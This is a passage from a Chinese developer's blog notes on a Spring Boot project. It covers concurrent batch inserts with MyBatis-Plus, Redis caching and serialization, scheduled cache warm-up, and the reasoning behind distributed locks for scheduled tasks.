class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">stopWatch.start();</span><br><span class="line">stopWatch.stop();</span><br><span class="line">stopWatch.getTotalTimeMillis()</span><br></pre></td></tr></table></figure><p>在Application类中使用<code>@EnableScheduling</code>开启spring对定时任务的支持之后，创建单次任务<br>使用@Scheduled注解，其中限制只能出现一个，否则单次限定失败.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//能成功限定单次执行任务（不优雅</span></span><br><span class="line"><span class="meta">@Scheduled(initialDelay = 5000, fixedRate = Long.MAX_VALUE)</span></span><br></pre></td></tr></table></figure><p><strong>for循环插入数据库的问题</strong></p><ol><li>建立和释放数据库连接（批量查询解决）</li><li>for循环是绝对线性的，一条卡住下一条就得等待</li></ol><p><strong>并发要注意执行的先后顺序无所谓，不要用到非并发类的集合（List x Collection.synchronizedList(new ArrayList&lt;&gt;()) √）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doConcurrencyInsertUsers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">    stopWatch.start();</span><br><span class="line">    <span class="comment">// 分十组</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">batchSize</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    List&lt;CompletableFuture&lt;Void&gt;&gt; futureList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        List&lt;User&gt; userList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="comment">//此处的j++不保证原子性 所以不能加到异步执行中</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">            user.setUsername(<span class="string">&quot;玉皇小白&quot;</span>);</span><br><span class="line">            user.setUserAccount(<span class="string">&quot;fakebo&quot;</span>);</span><br><span class="line">            user.setAvatarUrl(<span class="string">&quot;https://636f-codenav-8grj8px727565176-1256524210.tcb.qcloud.la/img/logo.png&quot;</span>);</span><br><span class="line">            user.setGender(<span class="number">0</span>);</span><br><span class="line">            user.setUserPassword(<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">            user.setPhone(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">            user.setEmail(<span class="string">&quot;123@qq.com&quot;</span>);</span><br><span class="line">            user.setTags(<span class="string">&quot;[]&quot;</span>);</span><br><span class="line">            user.setUserStatus(<span class="number">0</span>);</span><br><span class="line">            user.setUserRole(<span class="number">0</span>);</span><br><span class="line">            user.setSpaceCode(<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">            userList.add(user);</span><br><span class="line">            <span class="keyword">if</span> (j % batchSize == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 异步执行</span></span><br><span class="line">        CompletableFuture&lt;Void&gt; future = CompletableFuture.runAsync(() -&gt; &#123;</span><br><span class="line">        userService.saveBatch(userList, batchSize);&#125;);</span><br><span class="line">        futureList.add(future);</span><br><span class="line">    &#125;</span><br><span class="line">    CompletableFuture.allOf(futureList.toArray(<span class="keyword">new</span> <span class="title class_">CompletableFuture</span>[]&#123;&#125;)).join();</span><br><span class="line">    <span class="comment">// 20 秒 10 万条</span></span><br><span class="line">    stopWatch.stop();</span><br><span class="line">    System.out.println(stopWatch.getTotalTimeMillis());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义并发线程池测试（由于并发测试和自身机器的CPU核数有关，自定义约束）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">    <span class="number">40</span>,                                  <span class="comment">// 核心线程数</span></span><br><span class="line">    <span class="number">1000</span>,                                <span class="comment">// 最大线程数</span></span><br><span class="line">    <span class="number">10000</span>,                               <span class="comment">// 空闲线程存活时间</span></span><br><span class="line">    TimeUnit.MINUTES,                    <span class="comment">// 空闲线程存活时间单位</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">10000</span>)      <span class="comment">// 阻塞队列，用于存储等待执行的任务</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>CPU密集型：分配的核心线程数 &#x3D; CPU - 1（依赖于<strong>CPU的计算能力</strong>，需要大量的数学运算或逻辑处理，几乎始终占用 CPU 资源的任务）</li><li>IO密集型：分配的核心线程数可以大于CPU核数（依赖于<strong>输入&#x2F;输出操作</strong>（如网络通信、磁盘读写、数据库查询等）的任务）</li></ul><p>批量查询由Mybatis-Plus框架封装好，<code>saveBatch</code>方法实现.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doInsertUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StopWatch</span> <span class="variable">stopWatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StopWatch</span>();</span><br><span class="line">        stopWatch.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INSERT_NUM</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line">        List&lt;User&gt; userList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; INSERT_NUM; i++) &#123;</span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">            user.setUsername(<span class="string">&quot;玉皇鸡毛&quot;</span>);</span><br><span class="line">            user.setUserAccount(<span class="string">&quot;fakeyub&quot;</span>);</span><br><span class="line">            user.setAvatarUrl(<span class="string">&quot;https://636f-codenav-8grj8px727565176-1256524210.tcb.qcloud.la/img/logo.png&quot;</span>);</span><br><span class="line">            user.setGender(<span class="number">0</span>);</span><br><span class="line">            user.setUserPassword(<span class="string">&quot;12345678&quot;</span>);</span><br><span class="line">            user.setPhone(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">            user.setEmail(<span class="string">&quot;123@qq.com&quot;</span>);</span><br><span class="line">            user.setTags(<span class="string">&quot;[]&quot;</span>);</span><br><span class="line">            user.setUserStatus(<span class="number">0</span>);</span><br><span class="line">            user.setUserRole(<span class="number">0</span>);</span><br><span class="line">            user.setSpaceCode(<span class="string">&quot;11111111&quot;</span>);</span><br><span class="line">            userList.add(user);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//批量插入</span></span><br><span class="line">        userService.saveBatch(userList, <span class="number">100</span>);</span><br><span class="line">        stopWatch.stop();</span><br><span class="line">        System.out.println(stopWatch.getTotalTimeMillis());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>问题</strong><br>Closing non transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@4f93bf0a]<br><strong>解决</strong></p><ol><li>添加事务注释</li></ol><p><strong>数据库慢？</strong><br>预先把数据查出来，放到一个更快读取的地方，不再查询数据库.<br><strong>预加载缓存，定时更新缓存.【找一个用户少的时间更新】</strong>（定时任务）</p><p><strong>多个机器都要执行任务吗？</strong><br>分布式锁，控制只有一台机器去执行定时任务，其他机器不再重复执行了.<br>应用场景：限制只有一部分用户访问（限制数量），例如抢票.</p><h4 id="数据查询慢怎么办？"><a href="#数据查询慢怎么办？" class="headerlink" title="数据查询慢怎么办？"></a>数据查询慢怎么办？</h4><p>用缓存：提前把数据去出来保存好（通常保存到读写更快的介质，比如内存），就可以更快的读写.</p><h5 id="缓存的实现"><a href="#缓存的实现" class="headerlink" title="缓存的实现"></a>缓存的实现</h5><ul><li><p>Redis（分布式）</p></li><li><p>memcached（分布式）</p></li><li><p>Etcd（云原生架构的一个分布式存储，存储配置，扩容能力很强）</p><hr></li><li><p>ehcache（早期纯净单机）</p></li><li><p>本地缓存（Java内存Map）</p></li><li><p>caffeine（Java内存缓存，高性能）</p></li><li><p>Google Guava</p></li></ul><p><strong>什么是单机缓存</strong></p><ul><li>单机缓存是将数据存储在本地内存中的缓存机制，用于提升单个应用服务器的性能</li><li>用户A访问服务器A（有缓存A），用户B访问服务器B，但是B没有缓存A.</li><li>数据不一致性，用户多次访问服务器的时候可能拿到的数据不一致（比如查询余额）</li></ul><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><blockquote><p>NoSQL 数据库</p></blockquote><p>key-value（键值对）存储系统（区别MySQL，存储的是键值对）</p><h5 id="Redis的数据结构"><a href="#Redis的数据结构" class="headerlink" title="Redis的数据结构"></a>Redis的数据结构</h5><ul><li>String字符串类型：name：”yub”</li><li>List列表：names:[“yub”,”dogYub”]</li><li>Set集合：naems[“yub”,”dogyub”]（值不能重复）</li><li>Hash哈希：nameAge{ “yub” : 1, “dogYub”:2}（键不能重复）</li><li>Zset集合 ：names:{yub - 1, dogYub - 9 }  （值多一个分数）</li></ul><hr><ul><li>bloomfilter(布隆过滤器，主要从大量的数据中快速过滤值，比如邮件黑名单拦截)</li><li>geo(计算地理位置)</li><li>hyperloglog(pv&#x2F;uv)</li><li>pub&#x2F;sub(发布订阅，类似消息队列)</li><li>BitMap（01010101010101，存储大量可以压缩的信息）</li></ul><h5 id="Java中的实现方法"><a href="#Java中的实现方法" class="headerlink" title="Java中的实现方法"></a>Java中的实现方法</h5><h6 id="Spring-Data-Redis（推荐）"><a href="#Spring-Data-Redis（推荐）" class="headerlink" title="Spring Data Redis（推荐）"></a>Spring Data Redis（推荐）</h6><p>Spring Data：通用的数据访问框架，定义了一组<strong>增删改查的接口</strong>（操作mysql、jpa、redis）<br>Spring Data Redis就可以看成其对应的实现类</p><p>1）引入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-data-redis --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.6</span><span class="number">.13</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>2）配置Redis地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment">#redis 配置</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">    <span class="attr">database:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h6 id="Jedis"><a href="#Jedis" class="headerlink" title="Jedis"></a>Jedis</h6><p>独立于Spring操作 Redis 的 Java 客户端（默认线程不安全）<br>配合Jedis Pool使用</p><h6 id="Lettuce"><a href="#Lettuce" class="headerlink" title="Lettuce"></a>Lettuce</h6><p>高阶的操作 Redis 的Java客户端<br>支持异步和连接池（复用，减少开销）</p><h6 id="Redisson"><a href="#Redisson" class="headerlink" title="Redisson"></a>Redisson</h6><p>分布式操作Redis的Java客户端，像在使用本地的集合一样操作Redis（分布式Redis数据网格）</p><h6 id="JetCache"><a href="#JetCache" class="headerlink" title="JetCache"></a>JetCache</h6><p><strong>对比</strong></p><ol><li>使用的是Spring，没有过多的定制化要求，可以用Spring Data Redis，最方便</li><li>用的不是Spring，且追求简单化没有过高的性能要求，可以用Jedis+Jedis Pool</li><li>项目不是Spring，且追求高性能、高定制化，可以用Lettuce</li><li>项目是分布式的，需要用到一些分布式的特性（比如分布式锁、分布式集合），推荐使用redission</li></ol><p><strong>问题</strong><br>设置Redis增、查测试，再QuickRedis中查询不到内容.(乱码引起)</p><p><img src="G:/blog/source/imgs/2025-01/image-20250126172817712.png" alt="image-20250126172817712"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大多情况都使用String【灵活】    </span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ValueOperations</span> <span class="variable">valueOperations</span> <span class="operator">=</span> redisTemplate.opsForValue();</span><br><span class="line">        <span class="comment">//增</span></span><br><span class="line">        valueOperations.set(<span class="string">&quot;yubString&quot;</span>,<span class="string">&quot;god&quot;</span>);</span><br><span class="line">        valueOperations.set(<span class="string">&quot;yubInt&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        valueOperations.set(<span class="string">&quot;yubDouble&quot;</span>,<span class="number">2.0</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setId(<span class="number">518L</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;fun&quot;</span>);</span><br><span class="line">        valueOperations.set(<span class="string">&quot;yubUser&quot;</span>,user);</span><br><span class="line">        <span class="comment">//查</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">yub</span> <span class="operator">=</span> valueOperations.get(<span class="string">&quot;yubString&quot;</span>);</span><br><span class="line">        Assertions.assertTrue(<span class="string">&quot;god&quot;</span>.equals((String) yub));</span><br><span class="line">        yub = valueOperations.get(<span class="string">&quot;yubInt&quot;</span>);</span><br><span class="line">        Assertions.assertTrue(<span class="number">1</span> == (Integer) yub);</span><br><span class="line">        yub = valueOperations.get(<span class="string">&quot;yubDouble&quot;</span>);</span><br><span class="line">        Assertions.assertTrue(<span class="number">2.0</span> == (Double) yub);</span><br><span class="line">        System.out.println(valueOperations.get(<span class="string">&quot;yubUser&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用cmd写入新的yubString再观察（cmd默认存储到db0库）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;redis-cli</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; get</span><br><span class="line">(error) ERR wrong number of arguments <span class="keyword">for</span> &#x27;get&#x27; command</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; get yubString</span><br><span class="line">(nil)</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; <span class="built_in">set</span> yubString good</span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; get yubString</span><br><span class="line">&quot;good&quot;</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt;</span><br></pre></td></tr></table></figure><p>追踪源码发现Redis默认的（反）序列化构造器是JDK原生序列化影响</p><p><img src="G:/blog/source/imgs/2025-01/image-20250126174824202.png" alt="image-20250126174824202"><img src="G:/blog/source/imgs/2025-01/image-20250126174719972.png" alt="image-20250126174719972"></p><p>且查找源码发现只有一个<code>StringRedisTemplate</code>实现（），那么测试类Integer就无法转换.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringRedisTemplate</span> <span class="keyword">extends</span> <span class="title class_">RedisTemplate</span>&lt;String, String&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StringRedisTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setKeySerializer(RedisSerializer.string());</span><br><span class="line">        <span class="built_in">this</span>.setValueSerializer(RedisSerializer.string());</span><br><span class="line">        <span class="built_in">this</span>.setHashKeySerializer(RedisSerializer.string());</span><br><span class="line">        <span class="built_in">this</span>.setHashValueSerializer(RedisSerializer.string());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时只能自定义RedisTemplate，<strong>ConnectionFactory + 自己需要的序列化方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory connectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Object&gt; redisTemplate = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        redisTemplate.setConnectionFactory(connectionFactory);</span><br><span class="line">        redisTemplate.setKeySerializer(RedisSerializer.string());</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现成功，对应传进来的也是对象（序列化之故）.<br><img src="G:/blog/source/imgs/2025-01/image-20250126182958609.png" alt="image-20250126182958609"></p><p>查询发现ok</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; select <span class="number">1</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>[<span class="number">1</span>]&gt; get yubString</span><br><span class="line">&quot;\xac\xed\x00\x05t\x00\x03god&quot;</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>[<span class="number">1</span>]&gt;</span><br></pre></td></tr></table></figure><h5 id="设计缓存Key"><a href="#设计缓存Key" class="headerlink" title="设计缓存Key"></a>设计缓存Key</h5><p>目标：不同的用户看到的数据不同<br>systemId:modleId:func:<options>（原则不要和别人冲突）<br>yub:user:recommed:userId<br><strong>redis内存不能无限增加，一定要设置过期时间</strong></p><h5 id="缓存预热"><a href="#缓存预热" class="headerlink" title="缓存预热"></a>缓存预热</h5><p>问题：第一个用户访问还是很慢怎么办？</p><ul><li>缓存预热，可以让用户访问很快（解决该问题）且在一定程度上能保护数据库.</li><li>但增加了开发成本（需要额外的开发、设计），预热的时机和时间如果错了，有可能缓存的数据不对或太老</li><li>需要占用空间</li></ul><h6 id="怎么缓存？"><a href="#怎么缓存？" class="headerlink" title="怎么缓存？"></a>怎么缓存？</h6><ol><li>定时触发（常用）</li><li>模拟触发（手动触发）</li></ol><p><strong>实现</strong><br>用定时任务，每天刷新所有用户的推荐<br><strong>注意</strong></p><ol><li>缓存预热的意义（系统每日新增不多但是总的用户量多，提前一天缓存数据量也不大且能提高用户的加载速度）</li><li>缓存的空间不能太大，要预留给其他缓存空间（可能很多项目用同一个Redis）</li><li>缓存数据的周期（此处每天一次）</li></ol><h5 id="定时任务实现"><a href="#定时任务实现" class="headerlink" title="定时任务实现"></a>定时任务实现</h5><ol><li><strong>Spring Scheduler（SpringBoot默认整合）</strong></li><li>Quartz（独立于Spring存在的定时任务框架）</li><li>XXL—Job之类的分布式任务调度平台</li></ol><p>第一种方式</p><ol><li><p>主类开启@EnableScheduling</p></li><li><p>给要执行定时任务的方法添加@Scheduling注解，指定cron表达式或者执行频率（注意Spring中cron只接收六位如<code>0 20 15 * * *</code>，和Linux有所不同）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreCacheJob</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重点用户</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Long&gt; mainUserList = Arrays.asList(<span class="number">1L</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//每天执行预热推荐用户</span></span><br><span class="line"><span class="meta">@Scheduled(cron = &quot;0 53 22 * * *&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doCacheRecommendUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Long userId : mainUserList) &#123;</span><br><span class="line">        <span class="type">QueryWrapper</span> <span class="variable">queryWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        Page&lt;User&gt; userPage = userService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>, <span class="number">20</span>), queryWrapper);</span><br><span class="line">        <span class="type">String</span> <span class="variable">redisKey</span> <span class="operator">=</span> String.format(<span class="string">&quot;yub:user:recommed:userId:%s&quot;</span>, userId);</span><br><span class="line">        ValueOperations&lt;String, Object&gt; valueOperations = redisTemplate.opsForValue();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            valueOperations.set(redisKey, userPage,<span class="number">30000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;redis set ket error&quot;</span>,e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>}</p><p><a href="https://www.matools.com/cron/">在线Cron表达式生成器 - 码工具</a></p></li></ol><h5 id="控制定时任务的执行"><a href="#控制定时任务的执行" class="headerlink" title="控制定时任务的执行"></a>控制定时任务的执行</h5><ol><li>避免资源浪费，1w台服务器同时“打鸣”</li><li>脏数据，比如重复插入</li></ol><p><strong>要控制定时任务在同一时间只有1个服务器能运行定时任务.</strong></p><p><strong>怎么做？</strong></p><ol><li><p>分离定时任务和主程序，只在1个服务器能运行定时任务，成本太高.</p></li><li><p>写死配置，每个服务器都能执行定时任务，但是只有ip符合配置的服务器才真实执行业务逻辑（写死），其他的直接返回,成本最低.但是我们的IP可能是不固定的.</p></li><li><p>动态配置，配置方便更新（代码无需重启）.只有ip符合配置的服务器才真实执行业务逻辑.</p><ul><li><p>数据库</p></li><li><p>Redis</p></li><li><p>配置中心（Nacos、Apollo、Spring Cloud Config）</p><p>Q：服务器多了，IP不可控还是很麻烦要人工修改</p></li></ul></li><li><p>分布式锁，只有抢到锁的服务器才能执行业务逻辑.缺点：增加成本；优点：不用手动配置，多少个服务器都一视同仁.</p></li></ol><p>单机就会存在单点故障.</p><h5 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h5><p>在有限资源的情况下，控制同一时间（段）只有某些线程（用户&#x2F;服务器）能访问到资源.<br>Java实现锁：synchronized关键字、并发包的类</p><h5 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h5><p>为啥需要分布式锁？</p><ol><li>在有限资源的情况下，控制同一时间（段）只有某些线程（用户&#x2F;服务器）能访问到资源.</li><li>单个锁只对单个JVM有效.</li></ol><h5 id="分布式锁实现的关键"><a href="#分布式锁实现的关键" class="headerlink" title="分布式锁实现的关键"></a>分布式锁实现的关键</h5><h6 id="抢锁机制"><a href="#抢锁机制" class="headerlink" title="抢锁机制"></a>抢锁机制</h6><p>怎么保证同一时间只有1个服务器能抢到锁？</p><p><strong>核心思想</strong><br>先来的人吧数据改成自己的标识（服务器ip），后来的人发现标识已存在，抢锁失败，继续等待.等先来的人执行方法结束，清空标识之后其他的人继续抢锁.</p><p>MySQL数据库：<code>select for 